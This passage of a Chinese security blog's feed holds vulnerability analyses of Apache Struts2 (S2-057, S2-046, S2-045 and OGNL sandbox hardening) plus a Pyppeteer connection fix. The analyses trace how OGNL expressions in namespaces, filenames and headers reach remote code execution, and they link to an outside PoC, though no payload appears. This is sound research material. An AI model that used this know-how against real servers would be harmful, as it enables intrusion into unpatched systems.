src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471971431990.jpg" alt=""></p><p> 讲道理，2.5.17版本的修补真的是很暴力，直接在黑名单中加上了<code>com.opensymphony.xwork2.ognl.</code>也就是说我们根本没办法访问这个Struts2重写的ognl包了。</p></li><li><p>切断了动态引用的方式，需要利用构造函数生成</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471974788040.jpg" alt=""><br>不谈重写了<code>setExcludedClasses</code>和<code>setExcludedPackageNamePatterns</code>，单单黑名单的改进就极大的限制了利用。</p></li></ol><h2 id="4-2-2-5-19的改进"><a href="#4-2-2-5-19的改进" class="headerlink" title="4.2 2.5.19的改进"></a>4.2 2.5.19的改进</h2><ol><li><p>ognl包的升级，从3.1.15升级到3.1.21</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471982817893.jpg" alt=""></p></li><li><p>黑名单改进</p><pre><code>![](http://image-lucifaer.test.upcdn.net/2019/01/16/15471983666584.jpg)</code></pre></li><li><p>在<code>OgnlUtil</code>中<code>setXWorkConverter</code>、<code>setDevMode</code>、<code>setEnableExpressionCache</code>、<code>setEnableEvalExpression</code>、<code>setExcludedClasses</code>、<code>setExcludedPackageNamePatterns</code>、<code>setExcludedPackageNames</code>、<code>setContainer</code>、<code>setAllowStaticMethodAccess</code>、<code>setDisallowProxyMemberAccess</code>都从public方法变成了protected方法了：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471986400847.jpg" alt=""></p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471986545349.jpg" alt=""></p></li></ol><p>也就是说没有办法显式调用<code>setExcludedClasses</code>、<code>setExcludedPackageNamePatterns</code>、<code>setExcludedPackageNames</code>了。</p><h2 id="4-3-master分支的改变"><a href="#4-3-master分支的改变" class="headerlink" title="4.3 master分支的改变"></a>4.3 master分支的改变</h2><ol><li><p>ognl包的升级，从3.1.21升级到3.2.10，直接删除了<code>DefaultMemberAccess.java</code>，同时删除了静态变量<code>DEFAULT_MEMBER_ACCESS</code>，并且<code>_memberAccess</code>变成了final：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471994782111.jpg" alt=""></p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471998270846.jpg" alt=""></p></li><li><p><code>SecurityMemberAccess</code>不再继承<code>DefaultMemberAccess</code>而直接转为<code>MemberAccess</code>接口的实现：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15472003356029.jpg" alt=""></p></li></ol><p>可以看到Struts2.5.*基本上是对Ognl的执行做出了重大的改变，<code>DefaultAccess</code>彻底退出了历史舞台意味着利用父类覆盖<code>_memberAccess</code>的利用方式已经无法使用，而黑名单对于<code>com.opensymphony.xwork2.ognl</code>的限制导致我们基本上没有办法利用<code>Ognl</code>本身的API来更改黑名单，同时<code>_memberAccess</code>变为final属性也使得S2-057的这种利用<code>_memberAccess</code>暂时性的特征而进行“重放攻击”的方式测地化为泡影。</p><h2 id="4-4-总结"><a href="#4-4-总结" class="headerlink" title="4.4 总结"></a>4.4 总结</h2><p>Struts2随着其不断地发展，减少了原来框架的一部分灵活性而大大的增强了其安全性，如果按照master分支的改动趋势上看，以我的理解上来说，可以说现在基本上没得搞…</p><h1 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h1><ul><li><a href="https://cloud.tencent.com/developer/article/1024093" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1024093</a></li><li><a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit</a></li><li>《Struts2技术内幕》</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在分析Struts2漏洞的过程中就一直想把OGNL的运行机制以及Struts2对OGNL的防护机制总结一下，但是一直苦于自己对Struts2的理解不是很深刻而迟迟无法动笔，最近看了&lt;a href=&quot;https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;lgtm的这篇文章&lt;/a&gt;收获良多，就想在这篇文章的基础上总结一下目前自己对于OGNL的一些理解，希望师傅们斧正。&lt;/p&gt;
    
    </summary>
    
      <category term="安全研究" scheme="https://lucifaer.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="安全研究" scheme="https://lucifaer.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>S2-057（CVE-2018-11776）流程分析</title>
    <link href="https://lucifaer.com/2018/12/25/S2-057%EF%BC%88CVE-2018-11776%EF%BC%89%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/12/25/S2-057（CVE-2018-11776）流程分析/</id>
    <published>2018-12-25T08:45:00.000Z</published>
    <updated>2018-12-25T08:47:02.176Z</updated>
    
    <content type="html"><![CDATA[<p>S2-057的流程分析，该漏洞不好利用，但是整个调用流程是非常值得去研究的，跟一边后基本上对Struts2的执行流程就非常清楚了，关于POC将在后面一篇文章具体说明。</p><a id="more"></a><h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><blockquote><p>Problem<br>It is possible to perform a RCE attack when alwaysSelectFullNamespace is true (either by user or a plugin like Convention Plugin) and then: namespace value isn’t set for a result defined in underlying configurations and in same time, its upper package configuration have no or wildcard namespace and same possibility when using url tag which doesn’t have value and action set and in same time, its upper package configuration have no or wildcard namespace.</p></blockquote><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15452762673686.jpg" alt="-w1066"></p><p>从漏洞简述中可以看出漏洞在当应用设置<code>alwaysSelectFullNamespace</code>为<code>true</code>时有两种情况可以触发RCE：</p><ul><li>在xml配置中未设置<code>namespace</code>值，且上层包中未设置<code>namespace</code>或其未使用通配符所设置的<code>namespace</code>。</li><li>当使用未设置<code>value</code>和<code>action</code>值的<code>url</code>标签，且上层包中未设置<code>namespace</code>或其未使用通配符所设置的<code>namespace</code>。</li></ul><p>当然说啥都不如看diff来的更加直观，最直观的就是在<code>org.apache.struts2.dispatcher.mapper</code>中在<code>DefaultActionMapper</code>设置<code>namespace</code>时增添了对于<code>namespace</code>的校验：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15452769104052.jpg" alt=""></p><h1 id="0x01-调用流程分析"><a href="#0x01-调用流程分析" class="headerlink" title="0x01 调用流程分析"></a>0x01 调用流程分析</h1><p>从简述中我们看到比较关键的点是对<code>setNamespace</code>所设置的<code>namespace</code>进行了一次校验，那么漏洞可能就出现在这个地方。</p><p>而让我觉得比较好玩的地方就是我在找<code>mapping.setNamespace()</code>的调用栈时也同时找到了整条触发链以及ognl执行的点。我不知道其他的分析是如何在分析之初就可以准确定位到<code>org.com.opensymphony.xwork2.DefaultActionInvocation$executeResult</code>的，所以我想通过这一个diff出来的信息来找到整个漏洞的调用过程，以及解释为什么S2-057需要如此苛刻的条件。</p><p>漏洞修补的点在<code>parseNameAndNamespace</code>，也就是在<code>mapping.setNamespace()</code>前首先对<code>namespace</code>进行校验，校验这个<code>namespace</code>是否在<code>allowedActionNames</code>中。那么我们来顺着这个思路看一下<code>parseNameAndNamespace</code>的调用栈以及<code>mapping</code>的调用关系。</p><p><code>mapping</code>是一个<code>ActionMapping</code>实例，而<code>parseNameAndNamespace</code>的作用就是从URI中设置<code>ActionMapping</code>的<code>name</code>和<code>namespace</code>。现在知道了这个方法大致的调用栈和作用后，我们看一下哪里调用了这个方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15453859651549.jpg" alt=""></p><p><code>getMapping()</code>调用了这个方法，我们跟进一下，看看这个方法干了点什么。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15453861429673.jpg" alt=""></p><p>可以看到就是根据当前的请求和设置，生成该请求的<code>mapping</code>，这个<code>mapping</code>可以用来调用相关的<code>Action</code>，最后通过<code>ActionProxy</code>来根据<code>struts.xml</code>找到相应的<code>Action</code>，最后再通过<code>ActionProxy</code>来创建一个<code>ActionInvocation</code>实例来调用相应的拦截器。具体可以参考这张经典的图：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15453865907029.png" alt=""></p><p>ok，回到我们的漏洞，现在也就意味着我们需要跟到Struts2的运行流程中的<code>ActionMapper</code>流程这一块，来找哪里调用了<code>getMapping()</code>方法。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15453870168307.jpg" alt=""></p><p>接下来我们看一下<code>RepareOperations</code>的<code>findActionMapping</code>方法，该方法查询并选择性的创建<code>ActionMapping</code>是处于主运行流程中的一个方法。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456168239341.jpg" alt=""></p><p>可以看到这个方法有一个布尔变量<code>forceLoopup</code>，如果为true，则将会从<code>ActionMapper</code>实例中查找操作映射，并且该方法最后是返回一个<code>mapping</code>的，那么我们继续向上跟，看看哪里调用了此方法。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456171903019.jpg" alt=""></p><p>可以看到分别在准备Filter和执行Filter的过程中调用了<code>findActionMapping()</code>方法，从整个Struts的流程图中我们可以得知这两个调用点是在<code>ActionMapper</code>前后执行的，我们跟进<code>StrutsExecuteFilter</code>看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456177055061.jpg" alt=""></p><p>可以看到这里校验mapping是否获取成功，如果获取成功，则执行<code>execute.executeAction()</code>跟进看一下这个方法具体的执行流：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456332434804.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456332905210.jpg" alt=""></p><p>可以看到最后将执行到<code>Dispatcer.serviceAction</code>中，而这个方法为指定的<code>Action</code>生成了<code>ActionProxy</code>，也就是Struts2整体运行流程中通过<code>FilterDispatcher</code>生成<code>ActionProxy</code>的过程。我们具体看一下当mapping中存在<code>getResult</code>的结果时，所执行的<code>proxy.execute()</code>。首先看一下<code>execute()</code>的继承关系：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456336520583.jpg" alt=""></p><p>跟进<code>StrutsActionProxy</code>看一下具体实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456338930595.jpg" alt=""></p><p>跟进<code>invoke()</code>看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456343096327.jpg" alt=""></p><p>我们到<code>DefaultActionInvocation</code>来看一下<code>invoke()</code>的具体实现，代码很长，这里只截一部分：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456344098802.jpg" alt=""></p><p>可以看到如果<code>ActionInvocation</code>如果并未执行的话，是通过<code>executeResult()</code>来执行的，跟进看一下具体的操作：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456350143484.jpg" alt=""></p><p>可以看到这里首先会调用<code>createResult()</code>获取相应的result对象，如果result不为null则执行<code>result.execute(this)</code>，这里的<code>execute()</code>是由具体的result对象实现的。我们看一下<code>execute()</code>的继承关系，来看看有多少地方是可以被我们调用的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456369414739.jpg" alt=""></p><p>根据<a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="noopener">漏洞发现者的博客</a>所述以上红框所标注的类都是可以触发漏洞的点，我们选<code>ServletActionRedirectResult</code>这个类来看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456374576654.jpg" alt=""></p><p>注意到如果namespace不为null时，就会调用<code>namespace = conditionalParse(namespace, invocation);</code>，同时这段代码的关键性操作就是调用<code>setLocation()</code>对<code>tmpLocation</code>进行赋值，然后我们顺着<code>super</code>向上看：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456383794365.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456383883904.jpg" alt=""></p><p>而这里的location就是我们上面<code>setLocation()</code>所设置的<code>tmpLocation</code>，我们跟进<code>conditionalParse()</code>来看一下具体做了什么操作：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456385837811.jpg" alt=""></p><p>看到了熟悉的<code>TextParseUtil.translateVariables</code>，而这里的<code>param</code>是<code>tmpLocation</code>，而<code>tmpLocation</code>是通过<code>getUriFromActionMapping</code>来设置的，而和<code>ActionMapping</code>是有关的，这样一来就绕了回来，也就是说我们如果构造了一个存在ognl表达式的namespace，那么最后这个namespace会被作为参数带入到<code>TextParseUtil.translateVariables()</code>中进行ognl表达式解析，并执行表达式。</p><h1 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02 利用条件"></a>0x02 利用条件</h1><p>根据上面对于流程的分析，我们来梳理一下利用条件。</p><ul><li><p>我们需要在namespace中构造污点即包含ognl表达式，这需要我们自定义namespace，而这就需要我们在<code>default.properties</code>中设置<code>struts.mapper.alwaysSelectFullNamespace</code>为true，默认是为false的。</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15457076430046.jpg" alt=""></p></li></ul><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15457076759724.jpg" alt=""></p><ul><li><p>之后为了我们构造的ognl表达式可以执行也就是执行到这四个触发点，我们需要在Struts2执行时让Struts2找到这些触发的action，而这就意味着我们需要修改<code>struts-actionchaining.xml</code>，而那里看这几个action的类型呢？——<code>struts-default.xml</code>(没找到漏洞作者说的Portlet的点)：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15457265552716.jpg" alt=""></p><p>  也就是说需要根据类型修改<code>struts-actionchaining.xml</code>，才能完成action的跳转。</p></li></ul><p>所以这也是为什么这个漏洞利用条件苛刻的原因。</p><h1 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h1><ul><li><a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2018-11776</a></li><li><a href="https://struts.apache.org/core-developers/namespace-configuration.html" target="_blank" rel="noopener">https://struts.apache.org/core-developers/namespace-configuration.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;S2-057的流程分析，该漏洞不好利用，但是整个调用流程是非常值得去研究的，跟一边后基本上对Struts2的执行流程就非常清楚了，关于POC将在后面一篇文章具体说明。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://lucifaer.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>S2-046（CVE-2017-5638）分析</title>
    <link href="https://lucifaer.com/2018/12/17/S2-046%EF%BC%88CVE-2017-5638%EF%BC%89%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/12/17/S2-046（CVE-2017-5638）分析/</id>
    <published>2018-12-17T10:00:00.000Z</published>
    <updated>2018-12-17T10:01:50.839Z</updated>
    
    <content type="html"><![CDATA[<p>S2-046，是045的另外两个触发流程，分析起来还是很有趣的。</p><a id="more"></a><h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><blockquote><p>Problem<br>It is possible to perform a RCE attack with a malicious Content-Disposition value or with improper Content-Length header. If the Content-Disposition / Content-Length value is not valid an exception is thrown which is then used to display an error message to a user. This is a different vector for the same vulnerability described in S2-045 (CVE-2017-5638).</p></blockquote><p>可以看到046是和045一样的触发点，只不过是利用方式不同，当构造一个<code>Content-Disposition</code>或一个错误的<code>Content-Length</code>时就有可能造成RCE，而造成ognl表达式执行的点还是在<code>Jakarta Multipart</code>解析器中。</p><p>总体来说046和045如出一辙，重复的<code>FileUploadInterceptor</code>文件上传拦截器就可以不用分析了，直接瞅瞅触发流程就好。</p><h1 id="0x01-整体触发流程"><a href="#0x01-整体触发流程" class="headerlink" title="0x01 整体触发流程"></a>0x01 整体触发流程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MultiPartRequestWrapper$MultiPartRequestWrapper:86 # 处理requests请求</span><br><span class="line">  JakartaMultiPartRequest$parse:67 # 处理上传请求，捕捉上传异常</span><br><span class="line">    JakartaMultiPartRequest$processUpload:96 # 解析请求</span><br><span class="line">      JakartaMultiPartRequest$processFileField:105 # 处理上传表单</span><br><span class="line">        DiskFileItem$getName:259 # 获取并检查上传文件名</span><br><span class="line">          Steams$checkFileName:189 # 上传文件名中存在空白字符，抛出异常</span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>既然我们已经知道046的触发点和045的触发点是相同的，也就是说我们不需要重复去看<code>FileUploadInterceptor</code>执行ognl的过程了，我们只需要关注<code>FileUpload</code>这一部分的处理过程就好。</p><p>通过045我们知道ognl是通过报错信息传递的，而在046中，ongl也是通过这样的方法传递的。文件上传的过程中主要流程是在<code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest</code>的<code>parse</code>方法中进行处理的，我们再来看看除了045的<code>Content-Type</code>外，哪里还能利用。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450321051901.jpg" alt=""></p><p>注意红框框的这两部分，一部分是处理上传请求参数并创建新的<code>upload item</code>，而另一部分是在经过表单校验后，如果为上传表单时会执行的方法。而前一个是045的利用电，后一个是046的一个利用方式，接下来分别说一下046的两个利用流。</p><h2 id="2-1-JakartaMultiPartRequest上传filename中存在空字符"><a href="#2-1-JakartaMultiPartRequest上传filename中存在空字符" class="headerlink" title="2.1 JakartaMultiPartRequest上传filename中存在空字符"></a>2.1 JakartaMultiPartRequest上传filename中存在空字符</h2><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450323713374.jpg" alt=""></p><p>可以看到首先会判断文件上传表单中是否没有给定文件名（即没有选择上传文件），跟进看一下<code>getName()</code>方法是如何校验文件名的:</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450325297242.jpg" alt=""></p><p>在继承关系中我们看到<code>getName()</code>在<code>org.apache.commons.fileupload.disk</code>中有具体的实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450326052768.jpg" alt=""></p><p>继续跟进<code>checkFileName()</code>:</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450326547107.jpg" alt=""></p><p>可以看到首先判断文件名是否存在，之后判断文件名中是否存在空字符，而在java中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450345931743.jpg" alt=""></p><p>这样是可以通过检测的，所以也就是说我们可以通过构造一个包含ognl表达式的<code>fileName</code>进入if判断中，并且抛出一个<code>InvalidFileNameException</code>的异常，同时经过处理后的<code>fileName</code>拼接进报错信息中。</p><p>回到最开始的<code>parse()</code>方法中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450347505252.jpg" alt=""></p><p>可以看到这里的异常处理直接把报错信息传入<code>buildErrorMessage()</code>中，剩下的流程就和045中是一样的，会直接执行报错信息中的ognl表达式。</p><h2 id="2-2-JakartaStreamMultiPartRequest上传长度过长"><a href="#2-2-JakartaStreamMultiPartRequest上传长度过长" class="headerlink" title="2.2 JakartaStreamMultiPartRequest上传长度过长"></a>2.2 JakartaStreamMultiPartRequest上传长度过长</h2><p>这一个利用流程的通用性比之上面的来说，就差很多，首先<code>JakartaStreamMultiPartRequest</code>的处理流默认是不开启的，为了测试漏洞的话，可以在struts.xml中主动配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.multipart.parser"</span> <span class="attr">value</span>=<span class="string">"jakarta-stream"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><code>JakartaStreamMultiPartRequest</code>的对<code>Content-Length</code>的异常处理和<code>JakartaMultiPartRequest</code>不同：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450377939315.jpg" alt=""></p><p>判断<code>Content-Length</code>是否符合标准的地方是：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450378659312.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450378857311.jpg" alt=""></p><p>如果超出了<code>maxSize</code>则会进入<code>addFileSkippedError()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450381417880.jpg" alt=""></p><p>可以看到会直接把<code>fileName</code>拼接进错误信息中，然后传到<code>buildErrorMessage()</code>中，执行错误信息中的ognl表达式。</p><p><strong>所以总体来说两种利用方式的关键是构造含有ognl表达式的<code>fileName</code></strong>。</p><h1 id="0x03-构造POC"><a href="#0x03-构造POC" class="headerlink" title="0x03 构造POC"></a>0x03 构造POC</h1><p>和045的poc没什么区别，可以参考<a href="https://gist.github.com/frohoff/a3e24764561c0c18b6270805140e7600" target="_blank" rel="noopener">poc</a>，最终的效果为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450403368998.jpg" alt=""></p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-046" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-046</a></li><li><a href="https://gist.github.com/frohoff/a3e24764561c0c18b6270805140e7600" target="_blank" rel="noopener">https://gist.github.com/frohoff/a3e24764561c0c18b6270805140e7600</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;S2-046，是045的另外两个触发流程，分析起来还是很有趣的。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://lucifaer.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>如何解决Pyppeteer的Target closed错误</title>
    <link href="https://lucifaer.com/2018/12/14/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3Pyppeteer%E7%9A%84Target%20closed%E9%94%99%E8%AF%AF/"/>
    <id>https://lucifaer.com/2018/12/14/如何解决Pyppeteer的Target closed错误/</id>
    <published>2018-12-14T10:56:00.000Z</published>
    <updated>2018-12-14T11:01:43.543Z</updated>
    
    <content type="html"><![CDATA[<p>最近写自己的Sniper遇到的一个问题，很有意思。</p><a id="more"></a><p>如果你之前用过Chrome Headless的话，你一定知道Chrome亲儿子<code>Puppeteer</code>——Chrome官方提供的Nodejs的API。比较难受的是官方并没有提供Python的API项目来让我等以Python为生的人享受良好的使用体验。所以如果有尝试过利用Python来写Chrome Headless项目的，一定会知道<code>Pyppeteer</code>这个第三方库。这篇文不说这个库怎么用（请看<code>Puppeteer</code>的文档），而是说在使用<code>Pyppeteer</code>进行页面交互时经常会出现的<code>Protocol error Target.activateTarget: Target closed.</code>错误的解决方案。</p><h1 id="什么时候会出现这个错误？"><a href="#什么时候会出现这个错误？" class="headerlink" title="什么时候会出现这个错误？"></a>什么时候会出现这个错误？</h1><p>简单来说，就是在利用<code>Pyppeteer</code>操作Chrome Headless执行js进行页面内容提取或交互时会出现这个错误。具体一点说，就是你在执行类似<code>page.screenshot()</code>、<code>page.evaluate()</code>这类操作的时候可能会出现这个问题，尤其是在你处理的页面过长，比如需要你执行惰性加载的页面过长时就会出现这个错误。</p><h1 id="出现问题的原因？"><a href="#出现问题的原因？" class="headerlink" title="出现问题的原因？"></a>出现问题的原因？</h1><p>无论<code>Pyppeteer</code>还是<code>Puppeteer</code>他们都是通过WebSocket来与Chrome Headless进行通讯的，也就是说整个连接的流程应该是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Internals&gt;Headless Blink&gt;Network&gt;WebSockets</span><br></pre></td></tr></table></figure><p>在本地，Chrome Headless相当于一个WebSocket服务器，而<code>Pyppeteer</code>和<code>Puppeteer</code>是用底层的WebSocket客户端与Chrome Headless进行通信，从而执行各种操作的。</p><p>WebSocket检查连接是否超时是通过ping连接是否超时来确定的，首先客户端向服务端发送ping请求，服务端处理请求并给客户端一个pong的响应，如果服务端无法处理ping请求，即不会向客户端发送pong响应，客户端就会断开和服务端的连接，而这就是出现这个问题的关键。</p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=865002" target="_blank" rel="noopener">Chrom Headless在今年报了一个bug</a>，简单来说就是Chrome Headless的WebSocket服务器无法处理ping请求，也就是处理ping时不会返回pong，这就导致客户端一定会在20s左右的时间断开与Chrome Headless的连接，所以会显示连接目标已经关闭的这个错误。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>目前还没有一个特别好的解决方案，比较好的解决方案是降低WebSocket评定连接断开的优先级，也就是让客户端不发送ping请求，这样至少会把断开的时间从20s延长至15分钟。</p><p><code>Pyppeteer</code>的解决方案，在github已经有人提出，但是patch并未合并到主分支上，所以需要自己本地改一下。<a href="https://github.com/miyakogi/pyppeteer/blob/master/pyppeteer/connection.py#L43" target="_blank" rel="noopener">#159</a></p><p>在<code>pyppeteer/pyppeteer/connection.py</code>的43行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self._ws = websockets.client.connect(</span><br><span class="line">            self._url, max_size=<span class="keyword">None</span>, loop=self._loop)</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/miyakogi/pyppeteer/pull/160" target="_blank" rel="noopener">https://github.com/miyakogi/pyppeteer/pull/160</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=865002" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=865002</a></li><li><a href="https://github.com/miyakogi/pyppeteer/issues/175" target="_blank" rel="noopener">https://github.com/miyakogi/pyppeteer/issues/175</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近写自己的Sniper遇到的一个问题，很有意思。&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://lucifaer.com/categories/Python/"/>
    
    
      <category term="Python" scheme="https://lucifaer.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>S2-045（CVE-2017-5638）分析</title>
    <link href="https://lucifaer.com/2018/12/12/S2-045%EF%BC%88CVE-2017-5638%EF%BC%89%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/12/12/S2-045（CVE-2017-5638）分析/</id>
    <published>2018-12-12T08:35:00.000Z</published>
    <updated>2018-12-12T08:40:19.872Z</updated>
    
    <content type="html"><![CDATA[<p>S2-045，一个很经典的漏洞，和网上已经有的分析不同，我将整个漏洞的触发点和流程全都理了一遍，感觉收获良多，算是能自己说服自己的分析了。</p><a id="more"></a><h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><blockquote><p>Problem<br>It is possible to perform a RCE attack with a malicious Content-Type value. If the Content-Type value isn’t valid an exception is thrown which is then used to display an error message to a user.</p></blockquote><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445108788424.jpg" alt="-w756"></p><p>从漏洞简述中可以得知是struts在处理<code>Content-Type</code>时如果获得未期预的值的话，将会爆出一个异常，在此异常的处理中可能会造成RCE。同时在漏洞的描述中可以得知Struts2在使用基于<code>Jakarta Multipart</code>解析器来处理文件上传时，可能会造成RCE。</p><p><code>Jakarta Multipart</code>解析器在Struts2中存在于<code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest</code>是默认组件之一，首先把这一点记录下来。</p><p>接下来看一下diff：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445113437412.jpg" alt=""></p><p>可以看到关键点在于首先判断<code>validation</code>是否为空，若为空的话则跳过处理。可见关键点在于对于<code>validation</code>的处理。</p><h1 id="0x01-整体触发流程"><a href="#0x01-整体触发流程" class="headerlink" title="0x01 整体触发流程"></a>0x01 整体触发流程</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">MultiPartRequestWrapper$MultiPartRequestWrapper:86 # 处理requests请求</span><br><span class="line">  JakartaMultiPartRequest$parse:67 # 处理上传请求，捕捉上传异常</span><br><span class="line">    